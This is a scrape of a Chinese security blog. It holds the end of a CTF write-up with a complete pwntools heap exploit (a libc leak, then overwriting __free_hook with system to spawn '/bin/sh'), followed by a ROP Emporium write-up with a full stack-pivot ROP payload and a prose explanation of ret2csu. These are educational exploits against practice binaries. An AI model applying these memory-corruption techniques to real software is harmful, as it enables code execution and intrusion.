class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">students = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">reviews = [<span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">chunk_addr = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">scores = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">current_role = <span class="number">0</span></span><br><span class="line">current_sid = <span class="number">0</span></span><br><span class="line">student_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_student</span>(<span class="params">q</span>):</span><br><span class="line">	<span class="keyword">global</span> student_num</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;enter the number of questions: &#x27;</span>, <span class="built_in">str</span>(q).encode())</span><br><span class="line">	students[student_num] = <span class="number">1</span></span><br><span class="line">	chunk_addr[student_num] = <span class="string">&#x27;unknown&#x27;</span></span><br><span class="line">	student_num += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">give_score</span>():</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.recvuntil(<span class="string">b&#x27;marking testing papers.....\n&#x27;</span>)</span><br><span class="line">	sid = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		s = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">		<span class="keyword">if</span> s == <span class="string">b&#x27;finish&#x27;</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">elif</span> <span class="string">b&#x27;score&#x27;</span> <span class="keyword">in</span> s:</span><br><span class="line">			sid = s[<span class="number">14</span>] - <span class="number">0x30</span></span><br><span class="line">			scores[sid] = <span class="built_in">int</span>(s[<span class="number">29</span>:].decode(), <span class="number">10</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			scores[sid] -= <span class="number">10</span></span><br><span class="line">			<span class="keyword">if</span> scores[sid] &lt; <span class="number">0</span>:</span><br><span class="line">				scores[sid] += <span class="number">256</span></span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_review</span>(<span class="params">sid, size, comment, <span class="built_in">bytes</span>=<span class="literal">False</span>, enter=<span class="literal">True</span></span>):</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span> <span class="keyword">and</span> students[sid] == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which one? &gt; &#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">	<span class="keyword">if</span> reviews[sid] <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;please input the size of comment: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	<span class="keyword">if</span> enter:</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">			io.sendlineafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment.encode())</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io.sendlineafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">bytes</span>:</span><br><span class="line">			io.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment.encode())</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line">	reviews[sid] = comment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_parent</span>(<span class="params">sid</span>):</span><br><span class="line">	<span class="keyword">global</span> student_num</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">0</span> <span class="keyword">and</span> students[sid] == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;which student id to choose?&#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">	students[sid] = <span class="number">2</span></span><br><span class="line">	reviews[sid] = <span class="literal">None</span></span><br><span class="line">	student_num -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">	<span class="keyword">global</span> current_role</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class="built_in">str</span>(role).encode())</span><br><span class="line">	current_role = role</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_review</span>(<span class="params">address, offset=<span class="literal">True</span></span>):</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> io.recv(<span class="number">4</span>) == <span class="string">b&#x27;Good&#x27;</span>:</span><br><span class="line">		c = chunk_addr[current_sid] = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;add&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">13</span>:].decode(), <span class="number">16</span>)</span><br><span class="line">		chunk_addr[current_sid] -= <span class="number">0x10</span>		<span class="comment"># get the address of chunk head instead of writable head</span></span><br><span class="line">		io.sendlineafter(<span class="string">b&#x27;wherever you want! addr: &#x27;</span>, <span class="built_in">str</span>((c + address) * <span class="number">10</span>).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray</span>():</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">1</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_sid</span>(<span class="params">sid</span>):</span><br><span class="line">	<span class="keyword">global</span> current_sid</span><br><span class="line">	<span class="keyword">assert</span>(current_role == <span class="number">1</span> <span class="keyword">and</span> students[sid] != <span class="number">0</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;input your id: &#x27;</span>, <span class="built_in">str</span>(sid).encode())</span><br><span class="line">	current_sid = sid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_status</span>():</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;students: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(students)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;reviews: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(reviews)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;chunk_addr: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(chunk_addr)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;scores: &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="built_in">print</span>(scores)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;current_role: &#x27;</span> + <span class="built_in">str</span>(current_role))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add_student(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0xF0</span>, <span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">1024</span>-<span class="number">16</span>, <span class="string">&#x27;deadbeef&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 1: construct a fake chunk to bypass the check for free() of student 6</span></span><br><span class="line">write_review(<span class="number">4</span>, <span class="number">0x200</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x500</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>), <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 2: give student 4 reward to change the chunk address of student 5 to that of student 6</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">4</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give_score()	<span class="comment"># int overflow</span></span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">4</span>)</span><br><span class="line">check_review(<span class="number">0x39</span> + <span class="number">0x50</span>)</span><br><span class="line">chunk_addr[<span class="number">4</span>] += <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 3: give student 6 reward to change the chunk size of student 6 to 0x100 more</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">6</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">give_score()	<span class="comment"># int overflow</span></span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">6</span>)</span><br><span class="line">check_review(<span class="number">0x48</span> + <span class="number">0x100</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 4: delete student 6 to free the chunk with fake size: 0x500</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">call_parent(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 5: read the comment of student 5 to get and calculate the libc address</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_sid(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;here is the review:\n&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span></span><br><span class="line">libc_base = main_arena - (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]		<span class="comment"># system address got</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 6: get student 6 back, now the pointer of student 6 should be in the chunk of student 5</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">add_student(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 7: write comment for student 6: &#x27;/bin/sh&#x27;</span></span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">10</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 8: change the address of student 6 to write system address to __free_hook</span></span><br><span class="line">stu6_writeaddr = chunk_addr[<span class="number">4</span>] + <span class="number">0x50</span>	<span class="comment"># address of student 6 to write to</span></span><br><span class="line"></span><br><span class="line">payload = p64(chunk_addr[<span class="number">4</span>] + <span class="number">0x30</span>)	<span class="comment"># address of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)	<span class="comment"># size of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(free_hook)	<span class="comment"># change the write address of student 6 to __free_hook</span></span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0</span>, payload, <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 9: write system address to __free_hook</span></span><br><span class="line">write_review(<span class="number">6</span>, <span class="number">0</span>, p64(sys_addr), <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 10: change the address of student 6 back to buffer string &#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = p64(chunk_addr[<span class="number">4</span>] + <span class="number">0x30</span>)	<span class="comment"># address of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">4</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)	<span class="comment"># size of student 6 header chunk</span></span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(stu6_writeaddr)</span><br><span class="line">write_review(<span class="number">5</span>, <span class="number">0</span>, payload, <span class="built_in">bytes</span>=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### Step 11: delete student 6, getshell</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">call_parent(<span class="number">6</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ROP-Emporium-x86-64-7-8%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/ROP-Emporium-x86-64-7-8%E9%A2%98/" class="post-title-link" itemprop="url">ROP Emporium x86_64 7~8题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:46:23" itemprop="dateCreated datePublished" datetime="2023-02-28T22:46:23+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-02 16:32:56" itemprop="dateModified" datetime="2023-03-02T16:32:56+08:00">2023-03-02</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>5.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>5 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>ROP Emporium是一个提供ROP攻击学习样板程序的网站，一共8道题，每道题有64位、32位、ARM、MIPS共4种格式的ELF文件，适用于多种平台，难度依次递增。本文档为前6道题的x86_64位版本的解析。</p>
<p><a target="_blank" rel="noopener" href="https://ropemporium.com/index.html">ROP Emporium</a></p>
<h1 id="7-pivot"><a class="markdownIt-Anchor" href="#7-pivot"></a> 7. pivot</h1>
<p>看名字就知道，这是一道栈迁移的题目。</p>
<p>gadget如下，有对栈的操作，能够修改rsp，也就能进行栈迁移了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009BB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009BB</span><br><span class="line">.text:00000000004009BB usefulGadgets:</span><br><span class="line">.text:00000000004009BB                 pop     rax</span><br><span class="line">.text:00000000004009BC                 retn</span><br><span class="line">.text:00000000004009BD ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009BD                 xchg    rax, rsp</span><br><span class="line">.text:00000000004009BF                 retn</span><br><span class="line">.text:00000000004009C0 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009C0                 mov     rax, [rax]</span><br><span class="line">.text:00000000004009C3                 retn</span><br><span class="line">.text:00000000004009C4 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004009C4                 add     rax, rbp</span><br><span class="line">.text:00000000004009C7                 retn</span><br><span class="line">.text:00000000004009C7 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>程序一共有两次输入的机会，第一次是在伪造的栈中，第二次是直接接在后面的ROP。第二次的ROP长度不足，因此采用栈迁移。经过试验发现，第二个ROP的长度正好足够进行栈迁移。迁移后，我们只需要返回到ret2win函数即可。但是这个函数在lib文件中，加载基地址未知。对此，我们可以调用gadget获取lib中foothold_function函数的基地址，这也是源程序中唯一一个能够在plt节中找到的lib函数。注意到有一个gadget是mov rax, [rax]，既然我们能够控制rax的值，就可以将任意地址的值写入到rax中。如果没有这个gadget，我们就需要使用puts或printf函数将地址输出并返回到main函数中再次进行ROP注入。注意到还有一个gadget是add rax, rbp。我们读取lib中的函数偏移，让rbp等于ret2win的地址与foothold_function地址之差，就能够不通过输出直接将ret2win的地址保存到rax之中（在整个过程中rbp会通过leave, push, pop等指令保持不变）。注意到程序中有一条指令为jmp rax。我们直接跳转到这条指令即可让控制流跳转到ret2win函数。我想作者不让我们使用puts函数再进行一次注入的原因可能与程序本身有关，因为除了jmp rax之外，我们无法将返回地址写到栈上，这也就强迫我们使用所有的gadget。</p>
<p>参考：leave指令 = mov rsp, rbp;  mov rbp, [rbp]</p>
<p>payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">lib = ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x4009bb</span></span><br><span class="line">rsp = <span class="number">0x4009bd</span></span><br><span class="line">rax_addr = <span class="number">0x4009c0</span></span><br><span class="line">add_rax = <span class="number">0x4009c4</span></span><br><span class="line">jmp_rax = <span class="number">0x4007c1</span></span><br><span class="line">main_addr = <span class="number">0x400847</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;place to pivot: 0x&#x27;</span>)</span><br><span class="line">fake_stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>).decode(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain in fake stack</span></span><br><span class="line">payload = p64(elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>])		<span class="comment"># call foothold_function() first so that the .got section can be rewritten into real address of this function</span></span><br><span class="line">payload += p64(rax) + p64(elf.got[<span class="string">&#x27;foothold_function&#x27;</span>])	<span class="comment"># get rax to the address of .got</span></span><br><span class="line">payload += p64(rax_addr)		<span class="comment"># read the address to rax</span></span><br><span class="line">payload += p64(add_rax)</span><br><span class="line">payload += p64(jmp_rax)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP chain in stack</span></span><br><span class="line">payload = cyclic(<span class="number">32</span>)	<span class="comment"># 0x20</span></span><br><span class="line">payload += p64(lib.symbols[<span class="string">&#x27;ret2win&#x27;</span>] - lib.symbols[<span class="string">&#x27;foothold_function&#x27;</span>])	<span class="comment"># value that needed to be added to rax later</span></span><br><span class="line">payload += p64(rax) + p64(fake_stack)	<span class="comment"># pop fake stack address to rax</span></span><br><span class="line">payload += p64(rsp)						<span class="comment"># exchange rax and rsp, the length of first ROP comes to the limit: 0x40</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="8-ret2csu"><a class="markdownIt-Anchor" href="#8-ret2csu"></a> 8. ret2csu</h1>
<p>这是一种利用__libc_csu_init函数构造ROP的攻击方式。在本题中，由于是64位程序，因此在有些细节方面可能不好把握。</p>
<p><img src="1.png" alt="" /></p>
<p>本题有后门函数ret2win，但是要想拿到shell首先需要传入正确的参数，即第7行的3个参数。</p>
<p>ret2csu的攻击流程大致如下：</p>
<p>首先将返回地址改到ret2csu函数的这个地方：<br />
<img src="2.png" alt="" /><br />
在这里我们可以控制一系列寄存器的值。如果我们使用ROPgadget查找还能够发现惊喜。<br />
<img src="3.png" alt="" /><br />
注意到上面的pop rdi; ret了吗？它实际上是将原来的pop r15指令拆掉了，其机器码正好是5F，上面的pop rsi, ret同理。因此在这里我们可以控制的寄存器有：rbx,rbp,r12,r13,r14,r15,rdi,rsi，其中rdi,rsi是作为函数的前两个参数传递的，因此我们可以正确地传入前两个参数。</p>
<p>第三个函数参数在rdx中保存，可惜我们这里并不能控制rdx，这就需要用到__libc_csu_init函数的第二个gadget了：<br />
<img src="4.png" alt="" /><br />
这里可以将rdx赋值为r15的值，而我们之前能够控制r15的值，因此第三个参数能够正确传入。后面的call指令，由于我们能够控制r12和rbx的值，那么也就相当于我们可以call任意一个地址。</p>
<p>但是！有一个问题出现了。请注意，这里会对rdx,rsi,edi进行赋值。其中rdx和rsi的赋值都没问题，我们将参数事先存放到r15和r14中即可。问题就出在对edi的赋值上。根据测试检验发现，mov esi, r13d指令会将rdi的高32位清零。这就会导致我们的第一个参数错误。但好巧不巧的是其后面就是call指令，我们已经没有机会再去修改这个错误了。</p>
<p>我曾经想过，如果第一次能够call回到第一个ROP段中将rdi重新pop一次，之后直接返回到call指令，或许有用。但这里的call是取地址，如果将r12+rbx*8改为pop rdi;ret的地址，实际上call的并不是这里，而是会读取这里的机器码call出去，这当然是会崩溃的。</p>
<p>参考其他资料发现这里的指令依libc版本不同而可能不同，在有些版本中是mov rdi, r13，这样的话没有任何问题，但现在这种情况就需要动动脑子了。问师傅，鸽了两周都不回——无奈只能全论坛找答案。（菜）</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/devil8123665/article/details/123810055?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165052857116780357264558%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=165052857116780357264558&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-123810055.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&amp;utm_term=ROP_emporium+ret2csu&amp;spm=1018.2226.3001.4187">传送门</a></p>
<p>实际上通过ret，我们不是非得通过call指令转到ret2win函数，任何一个ret之后接ret2win函数的地址均可。所以这里的思路就是：让call指令无意义且在确保对寄存器影响最小的情况下返回，不能影响rdx的值，否则无效。</p>
